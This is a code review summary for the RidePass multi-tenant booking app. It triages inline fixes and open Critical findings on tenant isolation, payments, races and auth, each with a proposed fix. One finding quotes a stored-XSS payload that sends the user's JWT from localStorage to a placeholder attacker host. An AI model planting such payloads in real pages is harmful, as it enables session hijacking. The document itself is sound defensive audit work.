# RidePass Code Review — Summary

A thorough code review of the entire RidePass codebase, organised into 11 sections (foundation
→ sale flows → admin → super admin / comms → frontend infra). Each section's findings are in
`section-N.md`. This document is the triage layer: where the codebase stands, what got fixed
inline during the review, what's open, and what to do next.

## Headline

The codebase is **architecturally sound** — multi-tenancy is enforced at the right layer
(subdomain → middleware → policy handler cross-checks token claim against resolved tenant),
the payment integration uses the right primitives (PaymentIntents, separate webhook secret,
ledger row per sale), the schema is largely tenant-scoped + indexed correctly, and the
recent refactors (drag-drop composable, `v_recent_sales` view, waiver tabs, race-class
one-per-rider rule) show good discipline.

The risk surface is **breadth, not depth.** The codebase has grown from a single sale kind
(day passes) to seven, and most cross-cutting features (admin lists, refunds, cancels,
ledger writes, audit logs, customer aggregation, capacity checks) were never extended to
cover the newer kinds. The pattern across most Criticals is "feature X works for passes
and tickets; the other five kinds silently fall off the cliff." Combined with a handful of
real cross-tenant write vectors (now mostly closed) and a stored-XSS chain through
unsanitised `v_html` surfaces, the system has roughly **19 open Critical findings** and a
much longer tail of Highs. None of the open Criticals would void existing data; most
require a deliberate user action (admin tampering, malicious tenant admin, specific
concurrency) to fire. The actively-exploitable items got fixed inline.

## Inline fixes applied during this review (5)

| Section | Finding | Fix |
|---|---|---|
| 1 | `SuperAdminController.ListTenantLedger` had no `[Authorize]` — any unauth caller could read any tenant's full financial ledger | Added `[Authorize(Policy = SuperAdminRequirement.PolicyName)]` |
| 1 | `SeasonPassController.CheckIn` could flip any tenant's reservation status (the comment even acknowledged it) | Added `tenantId` param to `UpdateReservationStatus`, joined to `season_pass_purchase` for tenant predicate, updated both callers |
| 1 | Duplicate `[Authorize]` on `UpdateTenantServiceCharge` (cosmetic but adjacent to the Critical above) | Removed duplicate |
| 2 | Per-purchase confirmation emails never fired on the first webhook delivery — every guest checkout silently lost its receipt + QR | `MarkPaid` closure now mutates the in-memory `p.Status = "paid"` after the DB write so the email-loop filter finds the rows |
| 9 | Same cross-tenant write shape on `MarkRedeemed` (pass / ticket / extras) — staff at tenant A could flip purchases at tenant B to `redeemed` | Added `tenantId` to all three repos' `MarkRedeemed`, predicate `WHERE id = @id AND tenant_id = @tenantId`, updated all six call sites in ReportsController + RedemptionController |

All five passed build (`Services.csproj` 0 errors; `webapi.csproj` 0 CS errors, only the
documented running-process file-lock).

## Open Criticals (priority-ordered)

### Tier 1 — actively exploitable or causing data corruption today

1. **Stored XSS → JWT theft chain** (`S11`, `S10`). Tenant admin pastes
   `<img onerror="fetch('//attacker/'+localStorage.token)">` into the About panel
   (`Home.vue:150`), the Refund Policy footer (`Footer.vue:77`), or a campaign body
   (`Admin/Campaigns.vue:73`). Three `v-html` surfaces bypass the existing
   `RichTextView` sanitizer. JWT lives in `localStorage` (no `HttpOnly`/`Secure`), so
   the script reads + exfiltrates it. **Two-part fix:** wrap the three surfaces with
   `RichTextView` (or DOMPurify) AND move the token to an HttpOnly cookie scoped to
   `*.ridepass.io`.

2. **No email verification on `CreateAccount`** (`S7`). An attacker registers
   `victim@example.com` first; the real owner's later password-reset email goes to the
   attacker. Counter-created riders never get a claim email either. **Fix:** add a
   verification step before the account becomes useful, and email a claim link from
   `CounterController.CreateRider`.

3. **Birthdate bypass for minor/parent waiver flow** (`S7`).
   `UserController.UpdateBirthdate` lets any authenticated rider set their birthdate to
   any past date, bypassing `WaiverPolicy.IsMinor` and the parent-guardian capture.
   **Fix:** restrict birthdate to admin-only updates, or freeze it after the rider has
   signed any waiver, or require parent re-confirmation on changes.

4. **Counter sales bypass membership gate** (`S6`). Cashier at a membership-required
   track sells a day pass / race entry to a non-member; online flow rejects the same
   sale. **Fix:** lift `CheckMembershipGate` from `PurchaseController` into a shared
   service and invoke from `CounterController.CreateSale` before each pass / ticket
   line.

5. **Blackouts are decorative** (`S8`). Admin marks a date as closed → no buy flow
   actually checks. Riders book passes / reservations against blackout days. **Fix:**
   add a blackout check to `PurchaseController.BuyPass`, `BuyEventTicket`,
   `SeasonPassController.Reserve`, `RentalController` buy paths.

### Tier 2 — silent data corruption / dollar drift

6. **Rental sales never write a ledger entry** (`S2`).
   `PaymentController.OnPaymentSucceeded` covers passes + tickets, but rentals,
   memberships, extras, season passes never get a `tenant_ledger_entry`. Tenant balance
   and payout calculations under-report. **Fix:** extend the webhook fan-out to cover
   all seven kinds (the `v_recent_sales` view shows the column shape).

7. **Bundled-membership free-cart fast path strands membership in `pending`** (`S5`).
   When a voucher / gift card covers the whole cart, the membership row is created but
   never flipped to `paid`. `GetActive` filters on `status='paid'`, so the rider's
   bundled membership doesn't activate and the next membership-gated purchase rejects.
   **Fix:** in the free-cart branches of `BuyPass` and `BuyEventTicket`, also flip
   `membership_purchase` to `paid` and write its ledger row.

8. **Gift-card balance can go negative under concurrent redemption** (`S2`).
   `GiftCardRepository.ApplyToBalance` has no `WHERE balance_cents >= @amount` guard
   and no row lock. Two concurrent checkouts both pass `ResolveAsync` and both
   deduct. **Fix:** atomic UPDATE with a balance precondition; on zero rows affected
   abort the purchase with a "balance changed since validation" error.

9. **Variant + extras inventory race** (`S5`).
   `SumSoldVariant` / `SumSold` / `SumSoldProduct` all exclude `pending` and inventory
   checks are read-then-write with no lock — two concurrent buyers both claim the last
   "L Red" t-shirt. **Fix:** include `pending` in the sold count, OR convert the check
   into a single atomic INSERT with a constraint that fails on overbook.

10. **Rental per-item double-assignment** (`S5`).
    `rental_purchase_item` has `(purchase_id, item_id)` UNIQUE instead of `(item_id)`,
    AND `PickAvailablePerItemUnits` excludes `pending` purchases — two concurrent
    bookings both pick + persist the same unit. **Fix:** schema change to enforce
    one assignment per item per overlapping window, plus include `pending` in the
    in-flight set.

11. **Event capacity not unified across sale kinds** (`S5`). Only
    `SeasonPassController.Reserve` sums all three reservation buckets. `BuyPass`
    ignores season-pass reservations; `BuyEventTicket` skips event-level capacity
    completely (only tier inventory). **Fix:** centralise capacity check in a service
    that reads pass + ticket + season-pass reservations against `event.capacity`.

12. **`season_pass_purchase.purchaser_user_id` is `ON DELETE CASCADE`** (`S3`).
    Five other purchase tables use `RESTRICT` or `SET NULL`; deleting a rider silently
    nukes their paid season passes + all their cascaded reservations.
    **Fix:** new migration to switch the FK to `RESTRICT` (matching the other purchase
    tables) and decide the codebase-wide convention.

13. **Stripe `Transfer.create` and `Refund.create` have no idempotency key** (`S2`).
    A network retry or two parallel admin clicks dispatches the same transfer / refund
    twice — real dollars duplicated. **Fix:** generate an idempotency key per row
    (`payout-{id}` / `refund-{purchaseId}-{seq}`) and pass it via the SDK's
    `RequestOptions`.

### Tier 3 — audit / trust gaps

14. **Impersonation attribution missing from audit** (`S1` + `S10`). The
    `impersonated_by` claim is set on the impersonation token but never flows into
    audit-log rows. A super admin can "frame" a tenant_admin: refunds, payouts, and
    campaign sends performed during impersonation show the tenant_admin as actor.
    **Fix:** plumb the claim into `HttpContextAuditLogger.ActorUserId` /
    `ImpersonatedByUserId`. Consider whether some surfaces should refuse the action
    entirely under impersonation.

15. **`WaiverController.Update` edits in place** (`S7`). Title + body of an existing
    `tenant_waiver` row are mutated; every prior `rider_waiver_signature` then
    references different legal text than was signed. The admin UI shows a tonal hint
    "create a new waiver instead" but nothing enforces it. **Fix:** detect material
    body changes and force a new-waiver flow, or snapshot the signed-text into the
    signature row.

16. **No `audit_log` rows for `CancelPass` / `CancelTicket`** (`S6`). Cancellation
    leaves only `cancelled_by_user_id` on the row as trace. Same gap on every
    `TenantController` settings write, `UserController` role/status/password-reset,
    `CampaignController.Send`, and Stripe Connect onboarding. **Fix:** add audit
    logging to each — there's already an `IAuditLogger` helper, just unused at most
    call sites.

17. **Campaign unsubscribe framework absent** (`S10`). Send path is a stub today, but
    the shape (no `List-Unsubscribe` headers, no per-send unsubscribe token, no
    suppression list, no `unsubscribed_at` re-check between materialise and deliver)
    means whoever wires SMTP next will ship a CAN-SPAM-violating sender. **Fix
    before** delivery lands.

18. **`LocalFilesystemImageStorage.SaveAsync` path-traversal risk** (`S8`). Method
    accepts untrusted `fileExtension` verbatim. Most callers pre-allowlist content
    types, but gallery and hero upload paths call
    `Path.GetExtension(file.FileName)` directly. **Fix:** allowlist extensions inside
    `SaveAsync` itself.

19. **Counter sale supports neither coupons nor gift cards** (`S6`). Request DTO has
    no `CouponCode` / `GiftCardCode`. Walk-up riders can't redeem promo codes or
    stored balance. **Fix:** extend `CounterSaleRequest`, mirror the validation +
    redemption flow from `PurchaseController.BuyEventTicket`.

## Highs and Mediums — themes

Rather than enumerate ~80 Highs/Mediums one-by-one, here are the recurring themes — each
maps to multiple findings across sections. Triaging by theme will let you knock out
several findings per fix.

- **"X is missing for the other five kinds"** — `CustomerRepository` UNION misses
  extras/membership/rental/gift card (`S9`); `CustomerDetail.vue` only shows pass /
  ticket / season tabs (`S9`); `Admin/Purchases.vue` Cancel button only renders for
  pass + event_ticket (`S6`); webhook fan-out misses confirmation emails for
  membership / extras / spectator / rental (`S5`); five sale kinds have no admin
  Cancel endpoint at all (`S5`, `S6`). Pattern: every cross-cutting feature needs
  parity audit when a new kind is added. The `recent-sales-view` skill is the right
  shape for this; consider extending it to also nudge "did you add a cancel
  endpoint? a confirmation-email handler? a customer-aggregation row?"

- **Read-then-write inventory races** (no row locks, no atomic guards): event
  capacity (`S4`), tier inventory (`S4`), gift-card balance (`S2`), per-item rental
  units (`S5`), variant stock (`S5`), race-class one-per-rider (`S6`),
  `max_uses_per_user` coupon caps (`S4`). All exploitable under concurrency, none
  trivially exploitable in a single-cashier dev environment. **Fix pattern:** convert
  read-then-write checks into atomic INSERT-WITH-PRECONDITION or
  UPDATE-WHERE-AVAILABLE statements, then handle zero-row-affected as the
  "raced-and-lost" branch.

- **Status state machines not enforced in code**: cancelled / refunded / redeemed
  transitions can happen out of order in race windows (`S6`); five kinds have a
  `cancelled` status value in the CHECK constraint with no code path that writes it
  (`S5`); `pending` rows abandoned by users sit forever, holding event capacity
  and tier inventory (`S4`). **Fix pattern:** centralise transitions per kind in a
  service with explicit allowed-from/to mappings; add a background sweeper for
  abandoned `pending` rows.

- **Login / auth defense-in-depth gaps**: no rate limit (`S7`), no account lockout
  (`S7`), no failed-attempt audit (`S7`), JWT 24h TTL with no refresh or revocation
  (`S1`), `decodeJwt` lifts role from token claims so server-side demotions don't
  propagate until expiry (`S11`), tenant-user temp passwords returned in the JSON
  response (`S7`), reset URL logged with email when SMTP is unconfigured (`S7`),
  CORS in production accepts any origin with credentials (`S1`).

- **Stored XSS via `v-html`** — only three surfaces, but they each touch the home /
  footer / campaigns paths. Section 11's Critical chains this with the localStorage
  JWT for full session theft. Fix the v-html surfaces FIRST (cheap), then plan the
  cookie migration (harder, larger surface).

- **Frontend repetition**: 167 `(r.data as any).data` casts (`S11`); KIND_LABELS
  duplicated in 3+ files (`S11`); 30 nearly-identical service classes (`S11`);
  every component reimplements its own loading + error state. **Fix pattern:**
  one typed response wrapper, one shared constants module, one service-class base
  class with the common axios setup.

## Patterns worth replicating across the codebase

- **`TenantPermissionHandler.HandleRequirementAsync`** — explicit double check of
  role-has-permission AND `tenant_id_claim == resolved_tenant_id`. Canonical pattern.
- **`v_recent_sales` view + `IRecentSalesRepository`** — the right shape for any
  cross-cutting "all kinds" feature; the `recent-sales-view` skill keeps it in
  sync. Same pattern would help for cross-cutting refunds, customer aggregation,
  audit log queries.
- **`useDragReorder` composable** — well-shaped, reused across 10+ admin lists,
  handles the interleave + renumber correctly. Worth pointing at from future drag
  features.
- **`HasActiveRaceEntry` user_id-OR-email matching** — the right model for any
  one-per-rider rule that needs to span guest checkouts.
- **`PurchaseController` PI-then-DB ordering** for refunds — Stripe call first, DB
  second, with status precondition. Replicate everywhere money moves.
- **`TenantResolutionMiddleware` running before auth** — gives the policy handler
  `ITenantContext` so it can cross-check claim against subdomain. The lynchpin of
  the entire multi-tenant model.

## Open design questions

These aren't bugs — they're decisions worth revisiting deliberately before the platform
grows further.

1. **JWT in localStorage vs HttpOnly cookies.** The Critical XSS chain (S11) makes
   the case. Migration is real work (per-subdomain cookie scope, CSRF strategy,
   SPA-friendly refresh) but cuts a whole class of attacks.
2. **Refresh tokens + revocation.** 24h JWT lifetime with no revocation list means a
   stolen token works for up to 24h05m (default clock skew). Decide whether to add
   refresh tokens (rotation + server-side revocation) or just shorten the access
   token TTL.
3. **Cross-tenant rider behaviour.** Riders are global (no `TenantId`). When/if you
   add a "all my purchases across every track" page, the design will be load-bearing
   for tenant isolation — the model has no built-in cross-tenant filter for that.
4. **Two-person rule for financially-sensitive super-admin actions** (payouts ≥ $X,
   tenant service-charge changes, impersonation start). Decide whether to require
   step-up auth.
5. **Multi-waiver edit vs new-version policy.** S7's Critical (in-place body edit
   breaks audit trail) needs a deliberate policy decision: snapshot-on-sign vs
   force-new-version vs trust-the-admin.
6. **Single `purchase` parent table.** Section 5 surfaced that ~every cross-cutting
   feature has to fan out across seven tables. The `v_recent_sales` view + the
   `recent-sales-view` skill make this manageable, but the underlying model is the
   real reason features keep falling off the cliff. Worth revisiting the
   "purchase parent + per-kind child" pattern from your earlier conversation.
7. **Background worker coverage.** Section 5 + 6 + 10 flagged at least seven
   background jobs that don't exist (abandoned-cart sweeper, gift-card delivery
   worker, password-reset-token cleanup, audit log retention, event-notification
   queue, large-import background processor, scheduled survey close). Decide whether
   `TaskRunner` is the right home and what its observability model is.

## Recommended next steps

1. **This week** — Tier 1 Criticals (1–5). The XSS chain, email verification, and
   birthdate bypass are concrete liabilities; counter membership gate and blackouts
   are policy gaps that look like working features. None are deep refactors.
2. **Within 2 weeks** — Tier 2 Criticals (6–13). These need real implementation work
   (atomic SQL guards, ledger fan-out, idempotency keys, FK migration). Best done as
   a single dedicated sprint since they share themes.
3. **Within a month** — Tier 3 (14–19) plus the "Highs by theme" cleanup. Most of
   these are one-or-two-file changes that benefit from being batched (every admin
   write gets an audit row; every list query gets cross-kind parity).
4. **Architecture conversation** — pick three of the seven open design questions and
   decide. The XSS-cookie-migration one in particular blocks the Tier 1 Critical
   fix from being durable.
5. **Skill additions** — extend the `recent-sales-view` skill into a broader
   "purchase-shape parity" skill that nudges on Cancel endpoints, ledger writes,
   confirmation emails, and customer aggregation whenever a new sale kind is added.
   This is the single highest-leverage change to keep the surface from regressing
   again.

## Section index

| # | File | Headline |
|---|---|---|
| 1 | `section-1.md` | Multi-tenancy / auth / permissions — sound architecture, two Criticals fixed inline |
| 2 | `section-2.md` | Payments / ledger / webhooks — 4 Criticals, 1 fixed (emails); rentals/extras/membership invisible to ledger |
| 3 | `section-3.md` | Schema / migrations — 1 Critical (FK CASCADE on season_pass user), 7 Highs (waiver-cascade, missing FK, updated_at triggers, redemption uniqueness scope) |
| 4 | `section-4.md` | Day passes + tickets — no Criticals; spectator-waiver-bypass on tier-based path; abandoned-pending capacity hog |
| 5 | `section-5.md` | Other 5 sale kinds — 4 Criticals (rental double-assign, capacity not unified, variant race, bundled membership stranded) |
| 6 | `section-6.md` | Counter sales / cancellations — 3 Criticals (membership gate, no coupon/gift-card, no audit on cancel) |
| 7 | `section-7.md` | Waivers / identity — 3 Criticals (birthdate bypass, in-place waiver edit, no email verify) |
| 8 | `section-8.md` | Event + catalog admin — 2 Criticals (blackouts decorative, path-traversal) |
| 9 | `section-9.md` | Customers / reports / surveys — 1 Critical (MarkRedeemed cross-tenant), fixed inline |
| 10 | `section-10.md` | Super admin + comms — 2 Criticals (impersonation framing, campaign unsub absent) |
| 11 | `section-11.md` | Frontend infra — 1 Critical (XSS → JWT theft chain) |
